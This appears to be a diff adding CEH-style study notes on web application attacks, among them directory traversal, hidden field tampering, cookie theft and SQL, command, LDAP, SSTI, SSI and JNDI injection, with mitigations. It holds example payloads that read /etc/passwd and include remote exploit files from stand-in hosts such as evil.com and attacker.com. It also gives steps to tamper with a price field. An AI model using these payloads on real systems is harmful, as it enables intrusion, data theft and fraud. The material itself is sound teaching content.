@@ -5808,15 +5808,164 @@ Use Different Techniques to Conceal Malicious Programs and Maintain Remote Acces
 				- Log and monitor server requests – Detect anomalous request patterns.
 			- By implementing strict URL validation, access controls, and monitoring, organizations can effectively prevent SSRF attacks.
 	- Web Application Attacks:
-		- Directory Traversal
-		- Hidden Field Manipulation
+		- Directory Traversal:
+			- When access is provided outside a defined application, there is a risk of unintended information disclosure or modification. Complex applications are configured with multiple directories that serve as application components and data storage. An application can traverse these directories to locate and execute legitimate portions of its functionality.
+			- A directory traversal (or forceful browsing) attack occurs when an attacker is able to browse directories and files outside the normal application access. Such an attack exposes the directory structure of an application, as well as the underlying web server and operating system. Directory traversal allows attackers to access restricted directories—including application source code, configuration files, and critical system files—and execute commands outside the web server's root directory.
+			- Attackers can manipulate variables that reference files using "dot-dot-slash (../)" sequences and variations.
+			- With this level of access to a web application's architecture, an attacker can:
+				- Enumerate the contents of files and directories.
+				- Access pages that otherwise require authentication (and possibly payment).
+				- Gain insight into the application's structure and construction.
+				- Discover user IDs and passwords stored in hidden files.
+				- Locate source code and other sensitive files left on the server.
+				- View confidential data, such as customer information.
+			- Examples of Directory Traversal Attacks:
+				- Example 1: Retrieving a Web Application Backup:
+					- An attacker uses ../ to navigate back several directories and obtain a backup file of a web application:
+					- http://www.targetsite.com/../../../sitebackup.zip
+				- Example 2: Accessing the /etc/passwd File on a UNIX/Linux System
+					- This example attempts to obtain the /etc/passwd file, which contains user account information:
+					- http://www.targetsite.com/../../../../etc/passwd
+				- Example 3: Accessing Files Outside the Web Publishing Directory
+					- An attacker tries to access files located outside the web publishing directory using directory traversal:
+					- http://www.certifiedhacker.com/process.aspx?page=../../../../some_dir/some_file
+					- http://www.certifiedhacker.com/../../../../some_dir/some_file
+		- Hidden Field Manipulation:
+			- Attackers often exploit hidden field manipulation attacks against e-commerce websites, as many of these sites use hidden fields to store price and discount information. Developers commonly store client-side data—such as product prices and discount rates—in hidden fields, assuming this data is secure. However, attackers can manipulate these hidden values, altering product prices and completing transactions at fraudulent rates.
+			- When a user selects items on an HTML page, the selection is stored as form field values and sent to the server as an HTTP request (via GET or POST). HTML also allows values to be stored in hidden fields, which are not displayed in the browser but are still submitted as form parameters. Attackers can inspect the HTML code, modify these hidden field values, and send altered requests to the server to manipulate transactions.
+			- Example of Hidden Field Manipulation:
+				- A mobile phone listed at $1000 on an e-commerce website could be purchased for just $10 if an attacker modifies the hidden price field before submitting the order. Such attacks can lead to severe financial losses for website owners, despite their use of advanced security measures such as firewalls, intrusion detection systems (IDS), and antivirus software. Beyond financial damage, businesses may also suffer reputational harm.
+				- Code Example - Below is an example of an HTML form containing a hidden price field:
+					<form method="post" action="page.aspx">
+						<input type="hidden" name="PRICE" value="200.00">
+						Product name: <input type="text" name="product" value="Certifiedhacker Shirt"><br>
+						Product price: 200.00 <br>
+						<input type="submit" value="Submit">
+					</form>
+				- Steps to Exploit Hidden Field Manipulation:
+					- Open the HTML page in an editor.
+					- Locate the hidden field (e.g., <input type="hidden" name="PRICE" value="200.00">).
+					- Modify the value to a lower price (e.g., <input type="hidden" name="PRICE" value="2.00">).
+					- Save the modified HTML file locally and open it in a browser.
+					- Click the Buy button to submit the altered price, effectively committing electronic shoplifting.
 		- Cookie Snooping
 		- RC4 NOMORE Attack
-		- Same-Site Attack
-		- Pass-the-Cookie Attack
-		- SQL Injection
-		- Command Injection
-		- LDAP Injection
+		- Same-Site Attack:
+			- A same-site attack, also known as a related-domain attack, occurs when an attacker targets a subdomain of a trusted organization and redirects users to a malicious web page under their control. Attackers often exploit misconfigured or abandoned subdomains to execute this attack.
+			- Common top-level domains (TLDs) such as .edu, .com, and .org often have multiple subdomains, some of which may be left unused or improperly configured. Attackers take advantage of these vulnerabilities to hijack legitimate websites and create dangling records using extended TLDs (eTLDs). Websites that share the same eTLD+1 domain are classified as same sites, making them potential targets for same-site attacks.
+			- How Same-Site Attacks Work:
+				- These attacks exploit the idea that external threats are easier to identify than insider threats. Victims are redirected to an attacker-controlled page that mimics a secure, legitimate website. Attackers can compromise vulnerable subdomains through various methods, including:
+					- Phishing attacks
+					- Malware injection
+					- Cookie poisoning
+					- Abuse of JavaScript APIs
+				- Users who rely on dynamic DNS services are particularly vulnerable to these attacks. Additionally, because subdomains under the same eTLD+1 domain often share cookies, attackers can steal authentication cookies, leading to unauthorized access.
+			- Same-Site Attack Scenario:
+				- In a same-site attack, an attacker could redirect a user attempting to visit: www.certifiedhacker.com
+				- To a dangling subdomain they control, such as: rans.certifiedhacker.com
+				- Since both sites share the same base domain (certifiedhacker.com), users may mistakenly believe the malicious site is legitimate. Once redirected, the attacker can:
+					- Bypass security policies
+					- Steal credentials (credential sniffing)
+					- Conduct phishing attacks
+					- Inject malware
+		- Pass-the-Cookie Attack:
+			- A pass-the-cookie attack allows attackers to access a user’s web services without providing credentials or performing multi-factor authentication (MFA). This attack occurs when an attacker obtains a clone of a valid session cookie from the user’s browser and uses it to establish a session with the target web server. If attackers can retrieve the appropriate cookies, they may log in as a legitimate user, bypassing all authentication checkpoints.
+			- Attackers can obtain these cookies through various methods, including malware, phishing attacks, or specialized tools designed to extract stored browser data.
+			- For example, Mozilla Firefox stores cookies in a local SQLite database, which attackers can access using tools such as firefox_creds. If the captured cookie is a session cookie, an attacker can inject it into their own browser, effectively hijacking an active session. Additionally, attackers can use tools like Mimikatz to extract encrypted cookies and decrypt them for unauthorized access.
+		- SQL Injection:
+			- A SQL injection (SQLi) attack involves injecting malicious SQL queries into an application’s database query mechanism to manipulate or exploit the database. Many applications use SQL statements for authentication, role validation, data storage, retrieval, and linking to other data sources. SQL injection attacks succeed when an application fails to properly validate user input before passing it into an SQL query.
+			- Example of SQL Injection Attack:
+				- Consider the following SQL statement used to retrieve a user’s record: SELECT * FROM tablename WHERE UserID = 2302
+				- An attacker can manipulate this query by injecting an additional condition: SELECT * FROM tablename WHERE UserID = 2302 OR 1=1
+				- Since "1=1" always evaluates to TRUE, the query may return all records from the table, allowing the attacker to enumerate user IDs and extract sensitive data.
+			- Methods of SQL Injection:
+				- Attackers can execute SQL injection attacks through:
+				- Address bars (e.g., manipulating query parameters in URLs)
+				- Form fields (e.g., login forms, search boxes)
+				- Queries and searches (e.g., filtering and sorting mechanisms in web applications)
+			- Potential Consequences of SQL Injection Attacks
+				- SQL injection attacks can allow an attacker to:
+				- Log into an application without valid credentials
+				- Execute unauthorized queries and access sensitive data
+				- Modify or delete database records
+				- Drop entire databases, leading to data loss
+				- Exploit trust relationships between application components to gain access to other databases
+		- Command Injection:
+			- Command injection vulnerabilities allow attackers to execute arbitrary commands on a target system by exploiting web applications. These attacks typically involve passing malicious input to:
+				- Operating system commands via system calls
+				- External programs via shell commands
+				- Backend databases via SQL queries
+			- Poorly designed web applications—especially those using interpreters such as Perl, Python, PHP, and Bash—are particularly susceptible to command injection attacks. If an application fails to properly validate user input, attackers can insert malicious commands that the system executes blindly.
+			- Web applications often interact with operating system features and external programs to perform various functions. A common example is the sendmail program. If an application does not properly sanitize external HTTP request parameters, an attacker can inject special characters, malicious commands, or command modifiers, leading to unauthorized system execution. SQL injection is a well-known subset of command injection. These attacks are relatively easy to execute and detect, but understanding their full impact can be complex.
+			- Types of Command Injection Attacks:
+				- Shell Injection:
+					- Attackers craft input strings to gain shell access to a web server.
+					- Common functions vulnerable to shell injection include: system(), StartProcess(), java.lang.Runtime.exec(), System.Diagnostics.Process.Start()
+				- HTML Embedding:
+					- Used for website defacement by injecting additional HTML-based content.
+					- Attackers exploit vulnerabilities where user input is embedded into web pages without proper sanitization.
+				- File Injection:
+					- Attackers inject malicious code into system files through improperly validated user input.
+					- Example: http://www.certifiedhacker.com/vulnerable.php?COLOR=http://evil.com/exploit?
+			- Command Injection Example:
+				- An attacker exploits a vulnerable input field by injecting malicious code to change an account password: www.certifiedhacker.com/banner.gif||newpassword||1036|60|468
+					- The last two numbers specify the banner size.
+					- The attacker clicks Submit, causing the server to execute the injected command.
+					- The password for account 1036 is changed to "newpassword".
+					- The application incorrectly assumes the input field contains only a banner image URL, allowing the attack to succeed.
+				- File Injection Attacks:
+					- A file injection attack occurs when a vulnerable web application allows users to dynamically specify files for inclusion without proper validation. Attackers exploit this to include remote malicious files instead of trusted local files.
+					- How File Injection Works:
+						- The attacker supplies an external file instead of a legitimate local file.
+						- The application blindly processes the request and executes the external script.
+						- The attacker gains control over the application, leading to data theft, remote code execution, or further exploitation.
+					- Web applications using PHP are particularly vulnerable because of the extensive use of file includes in PHP scripts. If an application allows dynamic file inclusion without sanitization, attackers can execute arbitrary PHP scripts on the server.
+					- Vulnerable PHP Example:
+						<?php  
+						$drink = 'coke';  
+						if (isset($_GET['DRINK'])) {  
+							$drink = $_GET['DRINK'];  
+						}  
+						require($drink . '.php');  
+						?>
+					- Exploiting the Vulnerability:
+						- An attacker injects a remotely hosted exploit file: http://www.certifiedhacker.com/orders.php?DRINK=http://jasoneval.com/exploit?
+						- Since the application directly includes the provided URL as a PHP script, it executes the remote exploit, allowing the attacker to run arbitrary commands.
+				- Prevention and Mitigation:
+					- To prevent command and file injection attacks:
+					- Sanitize user input – Disallow special characters and restrict input to expected values.
+					- Use parameterized queries – Prevent attackers from injecting arbitrary commands.
+					- Limit system access – Restrict execution privileges for web applications.
+					- Disable remote file inclusion – Configure PHP and other languages to reject remote file executions.
+					- Implement web application firewalls (WAFs) – Detect and block suspicious requests.
+		- LDAP Injection:
+			- Lightweight Directory Access Protocol (LDAP) is used to store and organize information hierarchically in a directory tree based on attributes. It operates on a client-server model, allowing clients to query directory entries using filters. LDAP commonly runs over TCP/IP and serves as an open-standard protocol for querying and managing directory services.
+			- LDAP injection attacks function similarly to SQL injection attacks but target LDAP queries instead of SQL statements. Attackers exploit improperly validated user input to manipulate LDAP search filters, gaining unauthorized access to directory services or databases linked to the LDAP tree.
+			- How LDAP Injection Works:
+				- Web applications often construct LDAP queries dynamically based on user input.
+				- If input validation is weak, an attacker can inject malicious LDAP filters to alter the query logic.
+				- This allows attackers to bypass authentication, escalate privileges, or extract sensitive directory information.
+				- Attackers typically analyze search filter attributes to understand the underlying LDAP query structure. Once identified, they modify user-supplied input to determine whether the application is vulnerable and manipulate its responses accordingly.
+			- Consequences of LDAP Injection:
+				- Depending on the implementation, LDAP injection attacks can lead to:
+				- Login Bypass – Authenticate without valid credentials.
+				- Information Disclosure – Extract sensitive directory information.
+				- Privilege Escalation – Gain higher access levels.
+				- Data Modification – Alter stored directory information.
+			- Example of LDAP Injection:
+				- To test for LDAP injection vulnerabilities, an attacker sends an invalid query to observe how the server handles errors. If the LDAP server returns a detailed error message, the application may be vulnerable.
+				- Consider an authentication system using LDAP queries: (&(USER=certifiedhacker)(PASS=blah))
+				- If an attacker enters the username "certifiedhacker)(&)", the query transforms into: (&(USER=certifiedhacker)(&))(PASS=blah))
+				- The LDAP server only processes the first valid filter: (&(USER=certifiedhacker)(&))
+				- The (&) condition always evaluates to TRUE, allowing the attacker to log in without a valid password.
+			- Defending Against LDAP Injection:
+				- To mitigate LDAP injection risks, organizations should:
+				- Sanitize User Input – Restrict special characters like *, (), and &.
+				- Use Parameterized Queries – Avoid direct user input in LDAP queries.
+				- Implement Least Privilege Access – Limit directory access permissions.
+				- Disable Detailed Error Messages – Prevent attackers from learning LDAP query structures.
+				- Monitor and Log LDAP Queries – Detect suspicious activity early.
+			- By enforcing strict input validation and secure query handling, organizations can prevent LDAP injection attacks and secure their directory services.
 		- Cross-Site Scripting (XXS)
 		- Buffer Overflow
 		- Business Logic Bypass Attack
@@ -5843,3 +5992,89 @@ Use Different Techniques to Conceal Malicious Programs and Maintain Remote Acces
 		- Network Access Attacks
 		- DMZ Protocol Attacks
 		- MarioNet Attack
+		- Other Injection Attacks:
+			- Several other types of injection attacks exist, each exploiting different vulnerabilities in web applications and servers.
+			- Server-Side JavaScript (JS) Injection:
+				- Server-side JavaScript injection vulnerabilities occur when an application inserts user-controlled values into a string that is later evaluated dynamically by the server’s JavaScript interpreter. Attackers exploit improper validation of user input to modify the executed code, compromising application functionality and data. Additionally, attackers can use a compromised server as a launchpad for further attacks within the target network.
+				- Example of Server-Side JavaScript Injection:
+					- Attackers can cause a Denial of Service (DoS) attack by passing commands to the eval() function: while (1);
+					- This command forces the server’s event loop to use all processor resources, preventing it from handling further inputs until the process is restarted.
+					- Attackers can also read files from the server:
+						- res.end(require('fs').readdirSync('.').toString());
+						- res.end(require('fs').readdirSync('..').toString());
+					- Once file names are obtained, they can read file contents: res.end(require('fs').readFileSync('filename'));
+				- Furthermore, attackers can execute malicious binaries using the fs and child_process modules, leading to remote code execution (RCE).
+			- Server-Side Includes (SSI) Injection:
+				- Server-Side Includes (SSI) is a feature that allows developers to dynamically generate web page content using directives such as file includes, CGI variables, and shell commands. Once evaluated, the directives are replaced with the corresponding content before the final HTML is sent to users.
+				- Example of SSI Injection:
+					- Consider an application using the following directives:
+						<!--#include virtual="/footer.html" -->
+						<!--#echo var="DATE_LOCAL" -->
+					- If the application does not sanitize user input, attackers can inject malicious SSI directives: <!--#exec cmd="cat /etc/passwd" -->
+					- This command allows the attacker to retrieve sensitive system files, modify or delete server files, and execute arbitrary shell commands.
+			- Server-Side Template Injection (SSTI):
+				- Web applications often use template engines to separate business logic from data presentation. SSTI occurs when unsanitized user input is embedded into templates, allowing attackers to inject malicious template directives that can execute arbitrary code.
+				- Example of Server-Side Template Injection:
+					- Consider the following vulnerable PHP template:
+						<html>
+						<head><title>{{title}}</title></head>
+						<body>
+							<form method="{{method}}" action="{{action}}">
+								<input type="text" name="user" value="{{username}}">
+								<input type="password" name="pwd" value="">
+								<button type="submit">Submit</button>
+							</form>
+							<p>This page took {{microtime(true) - time}} seconds to render.</p>
+						</body>
+						</html>
+					- An attacker could inject a payload such as: {{ system('cat /etc/passwd') }}
+					- If the application processes this template, the attack results in remote code execution.
+			- Log Injection:
+				- Log injection occurs when unvalidated user input is written to application logs, allowing attackers to insert misleading or malicious log entries. This technique can be used to cover attack traces or manipulate system monitoring.
+				- Example of Log Injection:
+					- A typical log format: Date, Time, Username, ID, Source IP, Request
+					- An attacker manipulates the id parameter to inject malicious log entries: id=\r\n (Fake input)
+					- If the log system does not properly sanitize input, an attacker may also inject null bytes (%00) to truncate logs or hide activity.
+			- HTML Injection:
+				- HTML injection occurs when an attacker injects HTML code into a web page through unsanitized input fields. Unlike JavaScript injection (XSS), HTML injection focuses on modifying page content rather than executing scripts.
+				- Example of HTML Injection:
+					- Consider an application displaying search results:
+						<h1>Results matching your query:</h1>
+						<h2>{user_query}</h2>
+						<ol>
+							<li>Result A</li>
+							<li>Result B</li>
+						</ol>
+					- An attacker submits: </h2><a href="http://malicious-site.com">Click here for a special offer!</a><h2>
+					- This modifies the page: <h2></h2><a href="http://malicious-site.com">Click here for a special offer!</a><h2>
+					- If users click the malicious link, they may be redirected to a phishing site or malware download.
+			- Carriage Return Line Feed (CRLF) Injection:
+				- CRLF injection occurs when attackers insert carriage return (\r) and line feed (\n) characters into application input. This can be exploited for log manipulation, HTTP response splitting, and HTTP request smuggling.
+				- Example of CRLF Injection:
+					- A normal log entry: 10.10.10.10 - 09:25 - /index.php?page=about
+					- An attacker submits: /index.php?page=about&%0d%0a127.0.0.1 - 09:25 - /index.php?page=admin
+					- This results in a forged log entry, making it appear that the administrator accessed a page they never actually visited.
+			- Java Naming and Directory Interface (JNDI) Injection:
+				- JNDI is a Java API used for looking up objects in directory services such as LDAP, DNS, and RMI. JNDI injection occurs when an attacker tricks the application into resolving a remote, malicious object, leading to remote code execution (RCE).
+				- Example of JNDI Injection:
+					- A vulnerable Java method:
+						@RequestMapping("/lookup")
+						public Object lookup(@RequestParam String name) throws Exception {
+							return new javax.naming.InitialContext().lookup(name);
+						}
+					- An attacker provides: ldap://attacker.com/maliciousObject
+					- If the application fetches and executes the object, the attacker gains full control over the server.
+				- Another example:
+					Registry registry = LocateRegistry.createRegistry(1097);
+					Reference ref = new javax.naming.Reference("ExploitClass", "ExploitClass", "http://attacker.com/");
+					ReferenceWrapper refWrap = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
+					registry.bind("Object", refWrap);
+				- Here, the malicious Java class is hosted remotely and executed by the vulnerable application.
+			- Mitigation Strategies:
+				- To protect against these injection attacks, organizations should:
+				- Validate and Sanitize Input – Reject or properly escape special characters.
+				- Use Parameterized Queries – Avoid direct user input in queries.
+				- Disable Dynamic Code Execution – Prevent eval(), exec(), or similar functions.
+				- Implement Content Security Policies (CSP) – Restrict unsafe content.
+				- Limit Error Disclosure – Hide error messages that expose application logic.
+				- Regular Security Audits – Continuously test for vulnerabilities.
